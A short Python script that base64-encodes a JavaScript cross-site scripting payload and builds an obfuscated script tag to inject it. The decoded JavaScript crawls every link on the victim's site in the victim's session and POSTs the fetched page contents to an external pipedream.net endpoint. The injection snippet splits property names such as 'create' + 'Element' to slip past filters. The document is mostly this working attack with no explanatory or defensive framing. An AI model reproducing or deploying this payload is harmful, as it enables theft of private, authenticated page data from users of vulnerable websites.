import base64

script = '''
fetch('/').then(r=>r.text()).then(h=>{
  var l=[], d=(new DOMParser()).parseFromString(h,'text/html').querySelectorAll('a');
  d.forEach(e=>l.push(e.href));
  var p=l.map(u=>fetch(u).then(t=>t.text()));
  Promise.all(p).then(p=>{
    fetch("https://eomlp3rvjuni0t9.m.pipedream.net",{method:'POST',body:JSON.stringify(p)});
  });
});

'''  
encoded_script = base64.b64encode(script.encode())
print(encoded_script)

'''
<script>
e="CmZldGNoKCcvJykudGhlbihyPT5yLnRleHQoKSkudGhlbihoPT57CiAgdmFyIGw9W10sIGQ9KG5ldyBET01QYXJzZXIoKSkucGFyc2VGcm9tU3RyaW5nKGgsJ3RleHQvaHRtbCcpLnF1ZXJ5U2VsZWN0b3JBbGwoJ2EnKTsKICBkLmZvckVhY2goZT0+bC5wdXNoKGUuaHJlZikpOwogIHZhciBwPWwubWFwKHU9PmZldGNoKHUpLnRoZW4odD0+dC50ZXh0KCkpKTsKICBQcm9taXNlLmFsbChwKS50aGVuKHA9PnsKICAgIGZldGNoKCJodHRwczovL2VvbWxwM3J2anVuaTB0OS5tLnBpcGVkcmVhbS5uZXQiLHttZXRob2Q6J1BPU1QnLGJvZHk6SlNPTi5zdHJpbmdpZnkocCl9KTsKICB9KTsKfSk7Cgo=";
s = document["create" + "Element"]("script");
s["inner" + "HTML"] = atob(e);
document["body"]["append" + "Child"](s);
</script>
xxxx
'''